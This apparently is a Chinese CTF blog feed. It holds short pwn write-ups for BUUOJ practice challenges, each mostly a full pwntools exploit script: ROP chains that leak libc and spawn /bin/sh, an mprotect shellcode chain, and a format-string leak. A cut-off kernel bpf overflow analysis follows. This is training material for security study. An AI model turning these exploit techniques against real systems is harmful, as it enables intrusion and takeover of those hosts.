class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line">s = <span class="string">"node3.buuoj.cn:29659"</span></span><br><span class="line">host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>+<span class="string">'\xff'</span>*<span class="number">0x15</span></span><br><span class="line">sl(payload)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0xe7</span>+p32(<span class="number">0</span>)+p32(elf.plt[<span class="string">'puts'</span>])+p32(<span class="number">0x80485A0</span>)+p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">libcbase = uu32(r(<span class="number">4</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(hex(libcbase))</span><br><span class="line">payload = <span class="string">'\x00'</span>+<span class="string">'\xff'</span>*<span class="number">0x15</span></span><br><span class="line">sl(payload)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0xe7</span>+p32(<span class="number">0</span>)+p32(libcbase+<span class="number">0x3a80c</span>)</span><br><span class="line">ru(<span class="string">'\n'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="8-、ciscn-2019-en-2"><a href="#8-、ciscn-2019-en-2" class="headerlink" title="8 、ciscn_2019_en_2"></a>8 、ciscn_2019_en_2</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200430160524886.png" alt="image-20200430160524886"></p><p>跟 <code>ciscn_2019_c_1</code> 差不多，就是换了抑或的数。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_with</span><span class="params">(s)</span>:</span></span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        <span class="keyword">if</span> ord(s[c]) &lt;= <span class="number">0x60</span> <span class="keyword">or</span> ord(s[c]) &gt;<span class="number">0x7a</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(s[c]) &lt;= <span class="number">0x40</span> <span class="keyword">or</span> ord(s[c]) &gt;  <span class="number">0x5a</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(s[c]) &gt; <span class="number">0x2f</span> <span class="keyword">and</span> ord(s[c]) &lt;=<span class="number">0x39</span>:</span><br><span class="line">                    m = m+chr(ord(s[c])^<span class="number">0xc</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    m = m+s[c]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m = m+chr(ord(s[c])^<span class="number">0xd</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = m+chr(ord(s[c])^<span class="number">0xe</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">s = <span class="string">"node3.buuoj.cn:25754"</span></span><br><span class="line">host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_en_2"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./ciscn_2019_en_2'</span>)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> +p64(<span class="number">0</span>)+p64(<span class="number">0x0400c83</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(<span class="number">0x0400790</span>)+p64(<span class="number">0</span>)*<span class="number">0x40</span></span><br><span class="line">sla(<span class="string">"encrypted\n"</span>,deal_with(payload))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    ru(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = uu64(ru(<span class="string">"\n"</span>))</span><br><span class="line">libc =LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">"libc:"</span>+hex(libcbase))</span><br><span class="line">log.info(<span class="string">"sh_bin:"</span>+hex(bin_sh))</span><br><span class="line">log.info(<span class="string">"system_addr:"</span>+hex(system_addr))</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">raw_input()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x400c83</span>)+p64(bin_sh)+p64(<span class="number">0x400c81</span>)+p64(bin_sh)*<span class="number">2</span>+p64(system_addr)</span><br><span class="line">sla(<span class="string">"encrypted\n"</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="9、get-started-3dsctf-2016"><a href="#9、get-started-3dsctf-2016" class="headerlink" title="9、get_started_3dsctf_2016"></a>9、get_started_3dsctf_2016</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200430213527208.png" alt="image-20200430213527208"></p><p>有溢出。</p><p><img src="/images/image-20200430213552583.png" alt="image-20200430213552583"></p><p>然后有一个这样的函数，我给骗了。执行这里输出flag，本地可以远程不行</p><p>远程要 写shellcode，这里用mprotect 改变权限，执行shellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:29425"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./get_started_3dsctf_2016"</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x38</span>+p32(elf.symbols[<span class="string">'mprotect'</span>])+p32(<span class="number">0x08063adb</span>)+p32(<span class="number">0x080EB000</span>)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(elf.symbols[<span class="string">'read'</span>])+p32(<span class="number">0x08063adb</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload +=p32(<span class="number">0x080EB000</span>)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x080EB000</span>)</span><br><span class="line">raw_input()</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="10、-第五空间2019-决赛-PWN5"><a href="#10、-第五空间2019-决赛-PWN5" class="headerlink" title="10、[第五空间2019 决赛]PWN5"></a>10、[第五空间2019 决赛]PWN5</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200501153122819.png" alt="image-20200501153122819"></p><p>格式化字符串把 fd读到的 输出来，然后再输入密码</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:27288"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./pwn'</span>)</span><br><span class="line">raw_input()</span><br><span class="line">payload = p32(<span class="number">0x0804C044</span>)+<span class="string">"aaaaa%10$s"</span></span><br><span class="line">sla(<span class="string">"name:"</span>,payload)</span><br><span class="line">ru(<span class="string">'aaaaa'</span>)</span><br><span class="line">key = uu32(r(<span class="number">4</span>))</span><br><span class="line">log.info(hex(key))</span><br><span class="line">sa(<span class="string">"your passwd:"</span>,str(key)+<span class="string">'\x00'</span>*<span class="number">0x78</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="11、-BJDCTF-2nd-r2t3"><a href="#11、-BJDCTF-2nd-r2t3" class="headerlink" title="11、[BJDCTF 2nd]r2t3"></a>11、[BJDCTF 2nd]r2t3</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200501171858455.png" alt="image-20200501171858455"><img src="/images/image-20200501171910258.png" alt="image-20200501171910258"></p><p>存在溢出，然后strlen的是时候，v3的单字节，很简单就能绕过，比如0x105</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node3.buuoj.cn&quot;,27498)</span><br><span class="line">#p  = process(&quot;./r2t3&quot;)</span><br><span class="line">elf = ELF(&quot;r2t3&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.29-32.so&quot;)</span><br><span class="line">p.recvuntil(&quot;+]Please input your name:\n&quot;)</span><br><span class="line">raw_input()</span><br><span class="line">payload = b&apos;a&apos;*0x15+p32(elf.plt[&apos;puts&apos;])+p32(0x8048490)+p32(elf.got[&apos;puts&apos;])</span><br><span class="line">payload += b&apos;a&apos;*(0x201-len(payload))+b&quot;bbbb&quot;+b&apos;\x00&apos;*(0x400-0x205)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&apos;bbbb&apos;)</span><br><span class="line">libcbase = u32(p.recv(4)) - libc.symbols[&apos;puts&apos;]</span><br><span class="line">log.info(hex(libcbase))</span><br><span class="line">system = libcbase + libc.symbols[&apos;system&apos;]</span><br><span class="line">bin_sh = libcbase + libc.search( &apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;+]Please input your name:\n&quot;)</span><br><span class="line">payload = b&apos;a&apos;*0x15+p32(system)+p32(0x8048490)+p32(bin_sh)</span><br><span class="line">payload += b&apos;a&apos;*(0x201-len(payload))+b&quot;bbbb&quot;+b&apos;\x00&apos;*(0x400-0x205)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="12、ciscn-2019-n-8"><a href="#12、ciscn-2019-n-8" class="headerlink" title="12、ciscn_2019_n_8"></a>12、ciscn_2019_n_8</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20200504202401471.png" alt="image-20200504202401471"></p><p>scanf 溢出，然后精准覆盖</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">"node3.buuoj.cn:25220"</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./ciscn_2019_n_8'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"?\n"</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">13</span>+p32(<span class="number">17</span>)+p32(<span class="number">0</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="刷题" scheme="https://leave-Devour.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel 整数溢出-堆溢出漏洞及其利用与分析</title>
    <link href="https://leave-devour.github.io/2020/04/02/Linux-kernel-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>https://leave-devour.github.io/2020/04/02/Linux-kernel-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-02T08:15:58.000Z</published>
    <updated>2020-04-13T17:16:06.612Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞位于linux/bpf/queue_stack_maps.c 文件中。bpf(Berkeley Packet Filter)主要用于包过滤。</p><p>漏洞所在函数的调用链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue_stack_map_alloc &lt;- find_and_alloc_map&lt;- </span><br><span class="line">map_create &lt;- SYSCALL_DEFINE3(linux中定义syscall，3是代表有三个参数)</span><br></pre></td></tr></table></figure><p>queue_stack_map_alloc 函数的调用实际上是通过 <code>bpf_map_ops</code> 结构体中的 map_alloc进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">.map_alloc = queue_stack_map_alloc,<span class="comment">//***</span></span><br><span class="line">.map_free = queue_stack_map_free,</span><br><span class="line">.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">.map_update_elem = queue_stack_map_update_elem,<span class="comment">//***</span></span><br><span class="line">.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">.map_push_elem = queue_stack_map_push_elem,<span class="comment">//***</span></span><br><span class="line">.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先来分析bpf的syscall定义函数 ：</p><p>SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)，</p><p>该函数的主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 